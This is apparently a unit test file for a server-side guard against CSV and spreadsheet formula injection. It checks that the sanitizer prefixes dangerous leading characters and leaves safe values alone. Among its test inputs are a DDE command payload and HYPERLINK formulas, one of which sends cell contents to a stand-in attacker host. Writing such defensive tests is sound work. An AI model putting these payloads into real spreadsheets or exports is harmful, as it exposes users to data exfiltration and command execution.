// ═══════════════════════════════════════════════════════════════════════════
// Unit tests for server/lib/sheetsCsvGuard.js — CSV/formula injection guard
//
// Run: node tests/sheetsCsvGuard.test.js
// ═══════════════════════════════════════════════════════════════════════════

import { sanitizeCellValue } from "../server/lib/sheetsCsvGuard.js";

let passed = 0;
let failed = 0;

function assert(cond, label) {
  if (cond) { passed++; }
  else { failed++; console.error(`  ✗ ${label}`); }
}

function group(name, fn) {
  console.log(`\n— ${name}`);
  return fn();
}

// ── leading formula trigger characters ──────────────────────────────────────

group("prefixes leading = / + / - / @ with apostrophe", () => {
  assert(sanitizeCellValue("=cmd|'/c calc'!A1") === "'=cmd|'/c calc'!A1", "= prefixed");
  assert(sanitizeCellValue("+1234") === "'+1234", "+ prefixed");
  assert(sanitizeCellValue("-100") === "'-100", "- prefixed");
  assert(sanitizeCellValue("@SUM(A1:A10)") === "'@SUM(A1:A10)", "@ prefixed");
});

group("leading whitespace before formula trigger — bypass defense", () => {
  assert(sanitizeCellValue(" =HYPERLINK(\"http://evil.com\")") === "' =HYPERLINK(\"http://evil.com\")", "space before = prefixed");
  assert(sanitizeCellValue("\tinjected") === "\tinjected", "leading tab — first non-WS char safe, unchanged");
  assert(sanitizeCellValue("\rinjected") === "\rinjected", "leading CR — first non-WS char safe, unchanged");
});

group("HYPERLINK exfiltration payload — the canonical attack", () => {
  const payload = '=HYPERLINK("http://attacker.example/?d="&A1,"click")';
  const out = sanitizeCellValue(payload);
  assert(out === "'" + payload, "HYPERLINK payload prefixed");
  assert(out.charAt(0) === "'", "first char is apostrophe");
});

group("does NOT touch safe values", () => {
  assert(sanitizeCellValue("Juan Pérez") === "Juan Pérez", "name unchanged");
  assert(sanitizeCellValue("https://example.com") === "https://example.com", "URL unchanged");
  assert(sanitizeCellValue("099 123 456") === "099 123 456", "phone unchanged");
  assert(sanitizeCellValue("USD 1234.50") === "USD 1234.50", "money unchanged");
  assert(sanitizeCellValue("a=b") === "a=b", "= in middle unchanged");
});

group("handles edge cases", () => {
  assert(sanitizeCellValue("") === "", "empty string returns empty");
  assert(sanitizeCellValue(null) === "", "null returns empty");
  assert(sanitizeCellValue(undefined) === "", "undefined returns empty");
  assert(sanitizeCellValue(0) === "0", "number coerced to string");
  assert(sanitizeCellValue(false) === "false", "boolean coerced to string");
});

group("idempotent — sanitizing twice does not double-prefix", () => {
  // Note: a cell that starts with `'` followed by `=` is NOT considered unsafe
  // by Sheets — the apostrophe IS the literal-text marker. So sanitize(sanitize(x))
  // == sanitize(x) is the desired behavior because the second pass sees `'=…`
  // which starts with `'` (safe), not `=`.
  const once = sanitizeCellValue("=evil");
  const twice = sanitizeCellValue(once);
  assert(once === twice, `idempotent: ${once} === ${twice}`);
});

// ── summary ──────────────────────────────────────────────────────────────────

console.log(`\n${"═".repeat(60)}`);
console.log(`sheetsCsvGuard tests — passed: ${passed}, failed: ${failed}`);
console.log("═".repeat(60));
if (failed > 0) process.exit(1);
